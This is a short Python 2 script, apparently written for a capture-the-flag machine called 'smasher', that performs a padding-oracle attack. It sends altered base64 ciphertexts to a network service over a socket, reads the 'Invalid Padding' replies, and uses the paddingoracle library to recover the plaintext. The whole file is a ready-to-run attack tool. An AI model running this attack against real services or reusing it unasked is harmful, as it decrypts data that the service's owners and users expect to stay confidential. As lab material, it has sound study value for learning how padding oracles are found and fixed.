"""
Title: smasher-padding-oracle.py
Date: 20181123
Author: epi <epibar052@gmail.com>
  https://epi052.gitlab.io/notes-to-self/
Tested on: 
    Linux kali 4.17.0-kali3-amd64 
    paddingoracle 0.2.2
"""
from __future__ import print_function

import sys
import time
import socket
import logging
import argparse

from base64 import b64encode, b64decode
from urllib import quote, unquote

from paddingoracle import BadPaddingException, PaddingOracle

BUFLEN = 256

class PadBuster(PaddingOracle):
    def __init__(self, args, **kwargs):
        super(PadBuster, self).__init__(**kwargs)
        self.args = args 

    def oracle(self, data, **kwargs):
        attempt = b64encode(data)

        sock = socket.create_connection((self.args.target, self.args.port))

        resp = ""
        while True:
            if 'Insert ciphertext' in resp:
                break
            resp = sock.recv(BUFLEN)

        sock.send(attempt + '\n')

        resp = sock.recv(BUFLEN) 

        if 'Invalid Padding' in resp:
            raise BadPaddingException

        logging.debug('Got one: {}'.format(attempt))


if __name__ == '__main__':
    parser = argparse.ArgumentParser()

    parser.add_argument('-b', '--blocksize', help='block size', choices=[8, 16], default=8, type=int)
    parser.add_argument('-p', '--port', help="oracle's port", default=1337, type=int)
    parser.add_argument('-l', '--loglevel', help='logging level (default=DEBUG)', default='DEBUG', choices=['DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL'])
    parser.add_argument('ciphertext', help="ciphertext to crack")
    parser.add_argument('target', help="oracle's ip address")

    args = parser.parse_args()

    logging.basicConfig(level=args.loglevel)

    padbuster = PadBuster(args)

    encrypted_text = b64decode(unquote(args.ciphertext))

    plaintext = padbuster.decrypt(encrypted_text, block_size=args.blocksize, iv=bytearray(8))

    print('Decrypted ciphertext: {} => {!r}'.format(args.ciphertext, plaintext))
